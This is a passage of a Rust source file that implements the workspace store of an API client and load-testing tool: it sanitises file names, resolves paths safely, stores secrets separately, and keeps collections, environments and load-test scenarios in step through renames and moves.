//! The workspace file store. See docs/formats.md.
//!
//! A workspace is a plain directory of JSON files. There is no database.
//! Every write is atomic (temp file + rename). Node identity is a
//! workspace-relative path using forward slashes ("a ref").

use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};

use crate::error::{io_err, CoreError, Result};
use crate::interp::VarScope;
use crate::model::*;
use crate::model_grpc::{GrpcRequestDef, MergedGrpcRequest};
use crate::model_ws::{MergedWsRequest, WsRequestDef};

pub const REQ_EXT: &str = ".req.json";
pub const GRPC_EXT: &str = ".grpc.json";
pub const WS_EXT: &str = ".ws.json";
pub const LOAD_EXT: &str = ".load.json";
pub const USER_EXT: &str = ".user.js";
pub const ENV_EXT: &str = ".env.json";

const COLLECTIONS_DIR: &str = "collections";
const ENVIRONMENTS_DIR: &str = "environments";
const LOADTESTS_DIR: &str = "loadtests";
const INTERNAL_DIR: &str = ".swarmo";
const RUNS_DIR: &str = "runs";
const ANNOTATION_FILE: &str = "annotation.json";
const HISTORY_FILE: &str = "history.json";
const MANIFEST: &str = "swarmo.json";
const SECRETS: &str = "secrets.env.json";
const COLLECTION_FILE: &str = "collection.json";
const FOLDER_FILE: &str = "folder.json";

// ---------------------------------------------------------------------------
// Filename sanitization (Windows-safe)
// ---------------------------------------------------------------------------

const WINDOWS_RESERVED: &[&str] = &[
    "CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8",
    "COM9", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
];

/// Turn a display name into a filesystem-safe basename.
pub fn sanitize_name(name: &str) -> String {
    let mut out: String = name
        .chars()
        .map(|c| match c {
            '<' | '>' | ':' | '"' | '/' | '\\' | '|' | '?' | '*' => '_',
            c if (c as u32) < 0x20 => '_',
            c => c,
        })
        .collect();

    // Windows forbids trailing dots and spaces.
    while out.ends_with('.') || out.ends_with(' ') {
        out.pop();
    }
    let trimmed = out.trim_start().to_string();
    out = trimmed;

    if out.is_empty() {
        out = "untitled".to_string();
    }

    // Reserved device names (case-insensitive, with or without extension).
    let stem = out.split('.').next().unwrap_or(&out).to_uppercase();
    if WINDOWS_RESERVED.contains(&stem.as_str()) {
        out = format!("_{out}");
    }

    if out.len() > 120 {
        // A byte index inside a multi-byte character would panic in
        // `truncate`; walk back to the nearest boundary instead.
        let cut = (0..=120)
            .rev()
            .find(|&i| out.is_char_boundary(i))
            .unwrap_or(0);
        out.truncate(cut);
        while out.ends_with('.') || out.ends_with(' ') {
            out.pop();
        }
    }
    out
}

// ---------------------------------------------------------------------------
// Import report (shared with the Postman importer)
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Default, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ImportReport {
    pub collection_ref: String,
    pub collection_name: String,
    pub requests_imported: usize,
    pub folders_imported: usize,
    pub environment_created: Option<String>,
    pub warnings: Vec<String>,
}

// ---------------------------------------------------------------------------
// Store
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
pub struct WorkspaceStore {
    root: PathBuf,
}

impl WorkspaceStore {
    pub fn root(&self) -> &Path {
        &self.root
    }

    /// Open an existing workspace directory.
    pub fn open(root: impl Into<PathBuf>) -> Result<Self> {
        let root = root.into();
        if !root.is_dir() {
            return Err(CoreError::not_found(format!(
                "workspace directory does not exist: {}",
                root.display()
            )));
        }
        let store = Self { root };
        if !store.root.join(MANIFEST).is_file() {
            return Err(CoreError::invalid(format!(
                "{} is not a Swarmo workspace (no {MANIFEST})",
                store.root.display()
            )));
        }
        // Validate it parses.
        store.manifest()?;
        Ok(store)
    }

    /// Create a workspace, or adopt an existing directory that lacks a manifest.
    pub fn create(root: impl Into<PathBuf>, name: &str) -> Result<Self> {
        let root: PathBuf = root.into();
        fs::create_dir_all(&root).map_err(io_err(root.clone()))?;
        let store = Self { root };

        for d in [COLLECTIONS_DIR, ENVIRONMENTS_DIR, LOADTESTS_DIR] {
            let p = store.root.join(d);
            fs::create_dir_all(&p).map_err(io_err(p))?;
        }
        let internal = store.root.join(INTERNAL_DIR).join(RUNS_DIR);
        fs::create_dir_all(&internal).map_err(io_err(internal))?;

        let manifest_path = store.root.join(MANIFEST);
        if !manifest_path.is_file() {
            store.save_manifest(&WorkspaceManifest::new(name))?;
        }

        let gitignore = store.root.join(".gitignore");
        if !gitignore.exists() {
            write_atomic(&gitignore, b".swarmo/\n")?;
        }

        // A starter environment so variables work immediately.
        if store.list_environments()?.is_empty() {
            let mut env = Environment::new("local");
            env.variables.push(EnvVariable {
                key: "baseUrl".into(),
                value: "https://httpbin.org".into(),
                secret: false,
                enabled: true,
            });
            store.save_environment(&env)?;
            let mut m = store.manifest()?;
            m.active_environment = Some("local".into());
            store.save_manifest(&m)?;
        }

        Ok(store)
    }

    // -- path/ref plumbing --------------------------------------------------

    /// Resolve a workspace-relative ref to an absolute path, rejecting escapes.
    pub fn path_of(&self, node_ref: &str) -> Result<PathBuf> {
        let r = node_ref.replace('\\', "/");
        if r.starts_with('/') || r.len() > 1024 {
            return Err(CoreError::invalid(format!("unsafe ref: {node_ref}")));
        }
        if r.is_empty() {
            return Ok(self.root.clone());
        }
        let mut p = self.root.clone();
        for seg in r.split('/') {
            if seg.is_empty() || seg == "." {
                continue;
            }
            // Judged per segment: `..` must be the whole segment to be an
            // escape (a request named "Wait... what" is not one), while a
            // segment that is itself rooted or carries a drive letter — `C:`
            // — would make `push` *replace* the path rather than extend it.
            let mut comps = Path::new(seg).components();
            let plain = matches!(
                (comps.next(), comps.next()),
                (Some(std::path::Component::Normal(_)), None)
            );
            if seg == ".." || !plain || seg.contains(':') {
                return Err(CoreError::invalid(format!("unsafe ref: {node_ref}")));
            }
            p.push(seg);
        }
        // Belt and braces: whatever the segments were, the result must still
        // be inside the workspace.
        if !p.starts_with(&self.root) {
            return Err(CoreError::invalid(format!("unsafe ref: {node_ref}")));
        }
        Ok(p)
    }

    fn ref_of(&self, path: &Path) -> Result<String> {
        let rel = path.strip_prefix(&self.root).map_err(|_| {
            CoreError::invalid(format!("path outside workspace: {}", path.display()))
        })?;
        Ok(rel.to_string_lossy().replace('\\', "/"))
    }

    // -- manifest -----------------------------------------------------------

    pub fn manifest(&self) -> Result<WorkspaceManifest> {
        read_json(&self.root.join(MANIFEST))
    }

    pub fn save_manifest(&self, m: &WorkspaceManifest) -> Result<()> {
        write_json(&self.root.join(MANIFEST), m)
    }

    pub fn set_active_environment(&self, name: Option<String>) -> Result<()> {
        let mut m = self.manifest()?;
        m.active_environment = name;
        self.save_manifest(&m)
    }

    // -- environments -------------------------------------------------------

    fn env_path(&self, name: &str) -> PathBuf {
        self.root
            .join(ENVIRONMENTS_DIR)
            .join(format!("{}{}", sanitize_name(name), ENV_EXT))
    }

    pub fn list_environments(&self) -> Result<Vec<String>> {
        let dir = self.root.join(ENVIRONMENTS_DIR);
        if !dir.is_dir() {
            return Ok(Vec::new());
        }
        let mut names = Vec::new();
        for entry in fs::read_dir(&dir).map_err(io_err(dir.clone()))? {
            let entry = entry.map_err(io_err(dir.clone()))?;
            let fname = entry.file_name().to_string_lossy().to_string();
            if let Some(stem) = fname.strip_suffix(ENV_EXT) {
                // Prefer the declared name inside the file.
                match read_json::<Environment>(&entry.path()) {
                    Ok(e) => names.push(e.name),
                    Err(_) => names.push(stem.to_string()),
                }
            }
        }
        names.sort();
        Ok(names)
    }

    pub fn get_environment(&self, name: &str) -> Result<Environment> {
        read_json(&self.env_path(name))
    }

    pub fn save_environment(&self, env: &Environment) -> Result<()> {
        // Names map to file names through sanitising (and, on Windows and
        // macOS, case folding), so two distinct names can share one file.
        // Saving one must not silently replace the other.
        let path = self.env_path(&env.name);
        if let Ok(existing) = read_json::<Environment>(&path) {
            if existing.name != env.name {
                return Err(CoreError::invalid(format!(
                    "the name {} is too close to the existing environment {}",
                    env.name, existing.name
                )));
            }
        }
        self.write_environment(env)
    }

    fn write_environment(&self, env: &Environment) -> Result<()> {
        let path = self.env_path(&env.name);
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).map_err(io_err(parent))?;
        }
        // Secrets are stripped from the committed file and stored separately.
        let mut on_disk = env.clone();
        let mut secrets = self.read_secrets()?;
        for v in on_disk.variables.iter_mut() {
            if v.secret {
                let key = format!("{}/{}", env.name, v.key);
                if v.value.is_empty() {
                    secrets.remove(&key);
                } else {
                    secrets.insert(key, std::mem::take(&mut v.value));
                }
            } else {
                secrets.remove(&format!("{}/{}", env.name, v.key));
            }
        }
        self.write_secrets(&secrets)?;
        write_json(&path, &on_disk)
    }

    /// Rename an environment, carrying everything that refers to it by name.
    ///
    /// Environments are addressed by name rather than by an id, so a rename
    /// that only moved the file would silently detach the environment from
    /// every scenario using it, from the active-environment setting, and from
    /// its own secrets — which are keyed by `"<environment>/<variable>"`.
    pub fn rename_environment(&self, old_name: &str, new_name: &str) -> Result<()> {
        let new_name = new_name.trim();
        if new_name.is_empty() {
            return Err(CoreError::invalid("a name cannot be empty"));
        }
        if new_name == old_name {
            return Ok(());
        }
        if !self.env_path(old_name).is_file() {
            return Err(CoreError::not_found(format!(
                "no environment named {old_name}"
            )));
        }
        let (old_path, new_path) = (self.env_path(old_name), self.env_path(new_name));
        if new_path.is_file() && !same_file_name(&new_path, &old_path) {
            return Err(CoreError::invalid(format!(
                "an environment named {new_name} already exists"
            )));
        }

        // Read with secrets so save_environment re-files them under the new
        // name; otherwise every secret value would be orphaned.
        let mut env = self.get_environment_with_secrets(old_name)?;
        env.name = new_name.to_string();
        // Not save_environment: a capitalisation-only rename writes onto the
        // file that still declares the old name, which is the point.
        self.write_environment(&env)?;

        // Now the old copies can go, secrets included. Unless the two names
        // are one file on this filesystem — a capitalisation-only rename —
        // in which case the content just written is the right content and
        // only the directory entry needs its new spelling; removing "the
        // old file" here would remove the new one.
        let old_path = self.env_path(old_name);
        if same_file_name(&old_path, &new_path) {
            if old_path != new_path {
                fs::rename(&old_path, &new_path).map_err(io_err(old_path))?;
            }
        } else if old_path.is_file() {
            fs::remove_file(&old_path).map_err(io_err(old_path))?;
        }
        self.purge_env_secrets(old_name)?;

        let mut manifest = self.manifest()?;
        if manifest.active_environment.as_deref() == Some(old_name) {
            manifest.active_environment = Some(new_name.to_string());
            self.save_manifest(&manifest)?;
        }

        // Scenarios name their environment too; leaving them pointing at a
        // name that no longer exists would break them at the next run.
        for entry in self.list_load_tests()? {
            if !entry.node_ref.ends_with(LOAD_EXT) {
                continue;
            }
            let Ok(mut scenario) = self.get_scenario(&entry.node_ref) else {
                continue;
            };
            if scenario.environment.as_deref() == Some(old_name) {
                scenario.environment = Some(new_name.to_string());
                self.save_scenario(&entry.node_ref, &scenario)?;
            }
        }
        Ok(())
    }

    /// Drop the secrets filed under `name`, once its file is gone.
    ///
    /// Keys are `"<environment>/<variable>"` and both halves may contain a
    /// slash, so a bare prefix match on "prod/" would also take the secrets of
    /// an environment called "prod/eu". Keys that belong to a longer, still
    /// existing environment name are left alone.
    fn purge_env_secrets(&self, name: &str) -> Result<()> {
        let prefix = format!("{name}/");
        let others: Vec<String> = self
            .list_environments()?
            .into_iter()
            .filter(|o| o.len() > name.len() && o.starts_with(&prefix))
            .map(|o| format!("{o}/"))
            .collect();
        let mut secrets = self.read_secrets()?;
        secrets.retain(|k, _| {
            !k.starts_with(&prefix) || others.iter().any(|o| k.starts_with(o.as_str()))
        });
        self.write_secrets(&secrets)
    }

    pub fn delete_environment(&self, name: &str) -> Result<()> {
        let path = self.env_path(name);
        if path.is_file() {
            fs::remove_file(&path).map_err(io_err(path))?;
        }
        self.purge_env_secrets(name)?;
        let m = self.manifest()?;
        if m.active_environment.as_deref() == Some(name) {
            self.set_active_environment(None)?;
        }
        Ok(())
    }

    fn secrets_path(&self) -> PathBuf {
        self.root.join(INTERNAL_DIR).join(SECRETS)
    }

    pub fn read_secrets(&self) -> Result<HashMap<String, String>> {
        let p = self.secrets_path();
        if !p.is_file() {
            return Ok(HashMap::new());
        }
        read_json(&p)
    }

    fn write_secrets(&self, s: &HashMap<String, String>) -> Result<()> {
        let p = self.secrets_path();
        if let Some(parent) = p.parent() {
            fs::create_dir_all(parent).map_err(io_err(parent))?;
        }
        write_json(&p, s)
    }

    /// An environment with its secret values merged back in (for the editor).
    pub fn get_environment_with_secrets(&self, name: &str) -> Result<Environment> {
        let mut env = self.get_environment(name)?;
        let secrets = self.read_secrets()?;
        for v in env.variables.iter_mut() {
            if v.secret {
                if let Some(val) = secrets.get(&format!("{}/{}", env.name, v.key)) {
                    v.value = val.clone();
                }
            }
        }
        Ok(env)
    }

    /// Build the base variable scope for execution from an environment name.
    pub fn var_scope(&self, env_name: Option<&str>) -> Result<VarScope> {
        let mut scope = VarScope::new();
        let name = match env_name {
            Some(n) => Some(n.to_string()),
            None => self.manifest()?.active_environment,
        };
        if let Some(name) = name {
            if let Ok(env) = self.get_environment_with_secrets(&name) {
                let map: HashMap<String, String> = env
                    .variables
                    .iter()
                    .filter(|v| v.enabled)
                    .map(|v| (v.key.clone(), v.value.clone()))
                    .collect();
                scope.push_layer(map);
            }
        }
        // Empty mutable top layer for runtime overrides.
        scope.push_layer(HashMap::new());
        Ok(scope)
    }

    // -- tree ---------------------------------------------------------------

    pub fn tree(&self) -> Result<Vec<TreeNode>> {
        let dir = self.root.join(COLLECTIONS_DIR);
        if !dir.is_dir() {
            return Ok(Vec::new());
        }
        let mut out = Vec::new();
        let mut entries: Vec<_> = fs::read_dir(&dir)
            .map_err(io_err(dir.clone()))?
            .filter_map(|e| e.ok())
            .filter(|e| e.path().is_dir())
            .collect();
        entries.sort_by_key(|e| e.file_name());
        for e in entries {
            let path = e.path();
            let name = read_container_name(&path, COLLECTION_FILE)
                .unwrap_or_else(|| e.file_name().to_string_lossy().to_string());
            out.push(TreeNode {
                node_ref: self.ref_of(&path)?,
                name,
                kind: NodeKind::Collection,
                id: None,
                method: None,
                children: self.tree_children(&path)?,
            });
        }
        Ok(out)
    }

    fn tree_children(&self, dir: &Path) -> Result<Vec<TreeNode>> {
        let mut folders = Vec::new();
        let mut requests = Vec::new();

        let mut entries: Vec<_> = fs::read_dir(dir)
            .map_err(io_err(dir.to_path_buf()))?
            .filter_map(|e| e.ok())
            .collect();
        entries.sort_by_key(|e| e.file_name());

        for e in entries {
            let path = e.path();
            let fname = e.file_name().to_string_lossy().to_string();
            if path.is_dir() {
                let name = read_container_name(&path, FOLDER_FILE).unwrap_or_else(|| fname.clone());
                folders.push(TreeNode {
                    node_ref: self.ref_of(&path)?,
                    name,
                    kind: NodeKind::Folder,
                    id: None,
                    method: None,
                    children: self.tree_children(&path)?,
                });
            } else if fname.ends_with(WS_EXT) {
                // Checked before REQ_EXT for the same reason as gRPC below.
                let (name, method, id) = match read_json::<WsRequestDef>(&path) {
                    Ok(r) => (r.name, Some("WS".to_string()), Some(r.id)),
                    Err(e) => {
                        tracing::warn!(
                            "skipping unreadable WebSocket request {}: {e}",
                            path.display()
                        );
                        (
                            format!("{} (unreadable)", fname.trim_end_matches(WS_EXT)),
                            None,
                            None,
                        )
                    }
                };
                requests.push(TreeNode {
                    node_ref: self.ref_of(&path)?,
                    name,
                    kind: NodeKind::Request,
                    id,
                    method,
                    children: Vec::new(),
                });
            } else if fname.ends_with(GRPC_EXT) {
                // Checked before REQ_EXT: both end in ".json", and a corrupt
                // file must not break the whole tree.
                let (name, method, id) = match read_json::<GrpcRequestDef>(&path) {
                    Ok(r) => (r.name, Some("GRPC".to_string()), Some(r.id)),
                    Err(e) => {
                        tracing::warn!("skipping unreadable gRPC request {}: {e}", path.display());
                        (
                            format!("{} (unreadable)", fname.trim_end_matches(GRPC_EXT)),
                            None,
                            None,
                        )
                    }
                };
                requests.push(TreeNode {
                    node_ref: self.ref_of(&path)?,
                    name,
                    kind: NodeKind::Request,
                    id,
                    method,
                    children: Vec::new(),
                });
            } else if fname.ends_with(REQ_EXT) {
                // A corrupt request file must not break the whole tree.
                let (name, method, id) = match read_json::<RequestDef>(&path) {
                    Ok(r) => (r.name, Some(r.method), Some(r.id)),
                    Err(e) => {
                        tracing::warn!("skipping unreadable request {}: {e}", path.display());
                        (
                            format!("{} (unreadable)", fname.trim_end_matches(REQ_EXT)),
                            None,
                            None,
                        )
                    }
                };
                requests.push(TreeNode {
                    node_ref: self.ref_of(&path)?,
                    name,
                    kind: NodeKind::Request,
                    id,
                    method,
                    children: Vec::new(),
                });
            }
        }

        folders.extend(requests);
        Ok(folders)
    }

    // -- requests -----------------------------------------------------------

    pub fn get_request(&self, node_ref: &str) -> Result<RequestDef> {
        read_json(&self.path_of(node_ref)?)
    }

    pub fn save_request(&self, node_ref: &str, def: &RequestDef) -> Result<()> {
        write_json(&self.path_of(node_ref)?, def)
    }

    /// Create a new request inside a collection or folder. Returns its ref.
    pub fn create_request(&self, parent_ref: &str, name: &str) -> Result<String> {
        let parent = self.path_of(parent_ref)?;
        if !parent.is_dir() {
            return Err(CoreError::not_found(format!(
                "parent is not a directory: {parent_ref}"
            )));
        }
        let path = unique_path(&parent, &sanitize_name(name), REQ_EXT);
        let def = RequestDef::new(name);
        write_json(&path, &def)?;
        self.ref_of(&path)
    }

    /// Rename a request's display name, moving the file to match.
    /// Works for both HTTP (`*.req.json`) and gRPC (`*.grpc.json`) requests.
    pub fn rename_request(&self, node_ref: &str, new_name: &str) -> Result<String> {
        let path = self.path_of(node_ref)?;
        let mut any = AnyRequest::read(&path)?;
        any.set_name(new_name);
        let parent = path
            .parent()
            .ok_or_else(|| CoreError::invalid("request has no parent"))?
            .to_path_buf();
        let target = rename_target(&parent, &path, &sanitize_name(new_name), any.ext());
        any.write(&target)?;
        finish_rename(&path, &target)?;

        let new_ref = self.ref_of(&target)?;
        self.repoint_request_refs(node_ref, &new_ref, any.id())?;
        Ok(new_ref)
    }

    /// Repoint every scenario step that referred to a request that has moved.
    ///
    /// The id fallback in [`locate_request`](Self::locate_request) already
    /// makes a stale path *work*, but two things still need this: a scenario
    /// written before ids existed has no id to fall back on, and a step whose
    /// stored path is wrong shows up in the editor as "request not found" even
    /// though the request is right there. Updating the referrers keeps the
    /// files honest as well as working.
    fn repoint_request_refs(&self, old_ref: &str, new_ref: &str, id: &str) -> Result<()> {
        if old_ref == new_ref {
            return Ok(());
        }
        let Ok(tests) = self.list_load_tests() else {
            return Ok(());
        };
        for entry in tests {
            if !entry.node_ref.ends_with(LOAD_EXT) {
                continue;
            }
            let Ok(mut scenario) = self.get_scenario(&entry.node_ref) else {
                continue;
            };
            let mut touched = false;
            for step in scenario.steps.iter_mut() {
                let refers = step.request_ref == old_ref || step.request_id.as_deref() == Some(id);
                if refers {
                    step.request_ref = new_ref.to_string();
                    step.request_id = Some(id.to_string());
                    touched = true;
                }
            }
            if touched {
                // Written directly rather than through save_scenario: that
                // would re-resolve every other step as a side effect of this
                // one rename.
                write_json(&self.path_of(&entry.node_ref)?, &scenario)?;
            }
        }
        Ok(())
    }

    pub fn duplicate_request(&self, node_ref: &str) -> Result<String> {
        let path = self.path_of(node_ref)?;
        let mut any = AnyRequest::read(&path)?;
        any.set_id(uuid::Uuid::new_v4().to_string());
        let copy_name = format!("{} copy", any.name());
        any.set_name(&copy_name);
        let parent = path
            .parent()
            .ok_or_else(|| CoreError::invalid("request has no parent"))?;
        let target = unique_path(parent, &sanitize_name(&copy_name), any.ext());
        any.write(&target)?;
        self.ref_of(&target)
    }

    /// Move a request into another collection/folder. Returns the new ref.
    pub fn move_request(&self, node_ref: &str, new_parent_ref: &str) -> Result<String> {
        let path = self.path_of(node_ref)?;
        let any = AnyRequest::read(&path)?;
        let parent = self.path_of(new_parent_ref)?;
        if !parent.is_dir() {
            return Err(CoreError::not_found(format!(
                "target is not a directory: {new_parent_ref}"
            )));
        }
        // Dropped onto the folder it already lives in: nothing to move.
        // `unique_path` would otherwise see the file itself and suffix it.
        if path
            .parent()
            .is_some_and(|cur| same_file_name(cur, &parent))
        {
            return self.ref_of(&path);
        }
        let target = unique_path(&parent, &sanitize_name(any.name()), any.ext());
        any.write(&target)?;
        fs::remove_file(&path).map_err(io_err(path))?;

        let new_ref = self.ref_of(&target)?;
        self.repoint_request_refs(node_ref, &new_ref, any.id())?;
        Ok(new_ref)
    }

    // -- gRPC requests ------------------------------------------------------

    pub fn get_grpc_request(&self, node_ref: &str) -> Result<GrpcRequestDef> {
        read_json(&self.path_of(node_ref)?)
    }

    pub fn save_grpc_request(&self, node_ref: &str, def: &GrpcRequestDef) -> Result<()> {
        write_json(&self.path_of(node_ref)?, def)
    }

    pub fn create_grpc_request(&self, parent_ref: &str, name: &str) -> Result<String> {
        let parent = self.path_of(parent_ref)?;
        if !parent.is_dir() {
            return Err(CoreError::not_found(format!(
                "parent is not a directory: {parent_ref}"
            )));
        }
        let path = unique_path(&parent, &sanitize_name(name), GRPC_EXT);
        write_json(&path, &GrpcRequestDef::new(name))?;
        self.ref_of(&path)
    }

    /// Load a gRPC request and merge its inheritance chain in one step.
    pub fn merged_grpc_request(&self, node_ref: &str) -> Result<MergedGrpcRequest> {
        let req = self.get_grpc_request(node_ref)?;
        let ancestors = self.ancestors_of(node_ref)?;
        Ok(crate::model_grpc::merge_grpc_chain(&ancestors, &req))
    }

    /// Which protocol a request ref addresses, from its file extension.
    pub fn protocol_of(node_ref: &str) -> Protocol {
        if node_ref.ends_with(GRPC_EXT) {
            Protocol::Grpc
        } else if node_ref.ends_with(WS_EXT) {
            Protocol::Ws
        } else {
            Protocol::Http
        }
    }

    // -- WebSocket requests -------------------------------------------------

    pub fn get_ws_request(&self, node_ref: &str) -> Result<WsRequestDef> {
        read_json(&self.path_of(node_ref)?)
    }

    pub fn save_ws_request(&self, node_ref: &str, def: &WsRequestDef) -> Result<()> {
        write_json(&self.path_of(node_ref)?, def)
    }

    pub fn create_ws_request(&self, parent_ref: &str, name: &str) -> Result<String> {
        let parent = self.path_of(parent_ref)?;
        if !parent.is_dir() {
            return Err(CoreError::not_found(format!(
                "parent is not a directory: {parent_ref}"
            )));
        }
        let path = unique_path(&parent, &sanitize_name(name), WS_EXT);
        write_json(&path, &WsRequestDef::new(name))?;
        self.ref_of(&path)
    }

    /// Load a WebSocket request and merge its inheritance chain in one step.
    pub fn merged_ws_request(&self, node_ref: &str) -> Result<MergedWsRequest> {
        let req = self.get_ws_request(node_ref)?;
        let ancestors = self.ancestors_of(node_ref)?;
        Ok(crate::model_ws::merge_ws_chain(&ancestors, &req))
    }

    // -- collections & folders ----------------------------------------------

    pub fn create_collection(&self, name: &str) -> Result<String> {
        let base = self.root.join(COLLECTIONS_DIR);
        fs::create_dir_all(&base).map_err(io_err(base.clone()))?;
        let dir = unique_dir(&base, &sanitize_name(name));
        fs::create_dir_all(&dir).map_err(io_err(dir.clone()))?;
        write_json(&dir.join(COLLECTION_FILE), &ContainerDef::new(name))?;
        self.ref_of(&dir)
    }

    pub fn create_folder(&self, parent_ref: &str, name: &str) -> Result<String> {
        let parent = self.path_of(parent_ref)?;
        if !parent.is_dir() {
            return Err(CoreError::not_found(format!(
                "parent is not a directory: {parent_ref}"
            )));
        }
        let dir = unique_dir(&parent, &sanitize_name(name));
        fs::create_dir_all(&dir).map_err(io_err(dir.clone()))?;
        write_json(&dir.join(FOLDER_FILE), &ContainerDef::new(name))?;
        self.ref_of(&dir)
    }

    pub fn get_container(&self, node_ref: &str) -> Result<ContainerDef> {
        let dir = self.path_of(node_ref)?;
        let file = if dir.join(COLLECTION_FILE).is_file() {
            dir.join(COLLECTION_FILE)
        } else {
            dir.join(FOLDER_FILE)
        };
        if !file.is_file() {
            let name = dir
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_default();
            return Ok(ContainerDef::new(name));
        }
        read_json(&file)
    }

    pub fn save_container(&self, node_ref: &str, def: &ContainerDef) -> Result<()> {
        let dir = self.path_of(node_ref)?;
        let is_collection = self.is_collection_ref(node_ref);
        let file = dir.join(if is_collection {
            COLLECTION_FILE
        } else {
            FOLDER_FILE
        });
        write_json(&file, def)
    }

    fn is_collection_ref(&self, node_ref: &str) -> bool {
        let r = node_ref.replace('\\', "/");
        let depth = r.trim_end_matches('/').split('/').count();
        r.starts_with(COLLECTIONS_DIR) && depth == 2
    }

    pub fn rename_container(&self, node_ref: &str, new_name: &str) -> Result<String> {
        let dir = self.path_of(node_ref)?;
        let mut def = self.get_container(node_ref)?;
        def.name = new_name.to_string();
        self.save_container(node_ref, &def)?;

        let parent = dir
            .parent()
            .ok_or_else(|| CoreError::invalid("cannot rename workspace root"))?;
        // Same reasoning as `rename_target`: the directory being renamed is
        // itself an existing directory, so unique_dir would suffix a name that
        // only changed capitalisation.
        let desired = parent.join(sanitize_name(new_name));
        let target = if same_file_name(&desired, &dir) {
            desired
        } else {
            unique_dir(parent, &sanitize_name(new_name))
        };
        if target != dir {
            fs::rename(&dir, &target).map_err(io_err(dir))?;
        }
        let new_ref = self.ref_of(&target)?;
        self.repoint_prefix(node_ref, &new_ref)?;
        Ok(new_ref)
    }

    /// Repoint every scenario step whose request lives under a renamed
    /// container. The id fallback would still *find* those requests, but only
    /// after a full tree walk per step, and a scenario written before ids
    /// existed would show "request not found" for a request that is right
    /// there. Same reasoning as [`Self::repoint_request_refs`].
    fn repoint_prefix(&self, old_ref: &str, new_ref: &str) -> Result<()> {
        if old_ref == new_ref {
            return Ok(());
        }
        let old_prefix = format!("{old_ref}/");
        let Ok(tests) = self.list_load_tests() else {
            return Ok(());
        };
        for entry in tests {
            if !entry.node_ref.ends_with(LOAD_EXT) {
                continue;
            }
            let Ok(mut scenario) = self.get_scenario(&entry.node_ref) else {
                continue;
            };
            let mut touched = false;
            for step in scenario.steps.iter_mut() {
                if let Some(rest) = step.request_ref.strip_prefix(&old_prefix) {
                    step.request_ref = format!("{new_ref}/{rest}");
                    touched = true;
                }
            }
            if touched {
                write_json(&self.path_of(&entry.node_ref)?, &scenario)?;
            }
        }
        Ok(())
    }

    /// Delete a request file or a collection/folder directory (recursively).
    pub fn delete_node(&self, node_ref: &str) -> Result<()> {
        let path = self.path_of(node_ref)?;
        if path == self.root {
            return Err(CoreError::invalid("refusing to delete the workspace root"));
        }
        if path.is_dir() {
            fs::remove_dir_all(&path).map_err(io_err(path))?;
        } else if path.is_file() {
            fs::remove_file(&path).map_err(io_err(path))?;
        }
        Ok(())
    }

    // -- inheritance chain --------------------------------------------------

    /// The container chain (collection first, then folders top-down) for a request ref.
    pub fn ancestors_of(&self, request_ref: &str) -> Result<Vec<ContainerDef>> {
        let r = request_ref.replace('\\', "/");
        let segs: Vec<&str> = r.split('/').collect();
        // segs = ["collections", "<Coll>", ...folders..., "<file>.req.json"]
        if segs.len() < 3 || segs[0] != COLLECTIONS_DIR {
            return Ok(Vec::new());
        }
        let mut out = Vec::new();
        for end in 2..segs.len() {
            let dir_ref = segs[..end].join("/");
            let dir = self.path_of(&dir_ref)?;
            if dir.is_dir() {
                out.push(self.get_container(&dir_ref)?);
            }
        }
        Ok(out)
    }

    /// Load a request and merge its inheritance chain in one step.
    pub fn merged_request(&self, request_ref: &str) -> Result<crate::resolve::MergedRequest> {
        let req = self.get_request(request_ref)?;
        let ancestors = self.ancestors_of(request_ref)?;
        Ok(crate::resolve::merge_chain(&ancestors, &req))
    }

    // -- load tests ---------------------------------------------------------

    /// Every load test in the workspace, flattened.
    ///
    /// Recursive, so a test inside a folder is found by the callers that must
    /// see all of them — repointing steps after a rename, or rewriting the
    /// environment name. Use [`Self::load_tree`] for the sidebar.
    pub fn list_load_tests(&self) -> Result<Vec<LoadTestEntry>> {
        let mut out = Vec::new();
        self.collect_load_tests(&self.root.join(LOADTESTS_DIR), &mut out)?;
        Ok(out)
    }

    fn collect_load_tests(&self, dir: &Path, out: &mut Vec<LoadTestEntry>) -> Result<()> {
        if !dir.is_dir() {
            return Ok(());
        }
        let mut entries: Vec<_> = fs::read_dir(dir)
            .map_err(io_err(dir.to_path_buf()))?
            .filter_map(|e| e.ok())
            .collect();
        entries.sort_by_key(|e| e.file_name());
        for e in entries {
            let fname = e.file_name().to_string_lossy().to_string();
            let path = e.path();
            if path.is_dir() {
                self.collect_load_tests(&path, out)?;
                continue;
            }
            if !path.is_file() {
                continue;
            }
            self.collect_one_load_test(&path, &fname, out)?;
        }
        Ok(())
    }

    /// One file's entry, if it is a load test at all.
    fn collect_one_load_test(
        &self,
        path: &Path,
        fname: &str,
        out: &mut Vec<LoadTestEntry>,
    ) -> Result<()> {
        {
            if let Some(stem) = fname.strip_suffix(LOAD_EXT) {
                // The file is parsed for its name anyway; the id comes free.
                let parsed = read_json::<LoadScenario>(path).ok();
                let name = parsed
                    .as_ref()
                    .map(|s| s.name.clone())
                    .unwrap_or_else(|| stem.to_string());
                out.push(LoadTestEntry {
                    node_ref: self.ref_of(path)?,
                    name,
                    kind: LoadTestKind::Scenario,
                    id: parsed.map(|s| s.id),
                    children: Vec::new(),
                });
            } else if let Some(stem) = fname.strip_suffix(USER_EXT) {
                out.push(LoadTestEntry {
                    node_ref: self.ref_of(path)?,
                    name: stem.to_string(),
                    kind: LoadTestKind::UserScript,
                    id: None,
                    children: Vec::new(),
                });
            }
        }
        Ok(())
    }

    /// The load tests as a tree, folders first at each level.
    ///
    /// Mirrors the collection sidebar's shape so the two read the same way,
    /// but the folders here own nothing — they are a place to put things.
    pub fn load_tree(&self) -> Result<Vec<LoadTestEntry>> {
        self.load_tree_at(&self.root.join(LOADTESTS_DIR))
    }

    fn load_tree_at(&self, dir: &Path) -> Result<Vec<LoadTestEntry>> {
        if !dir.is_dir() {
            return Ok(Vec::new());
        }
        let mut folders: Vec<LoadTestEntry> = Vec::new();
        let mut tests: Vec<LoadTestEntry> = Vec::new();

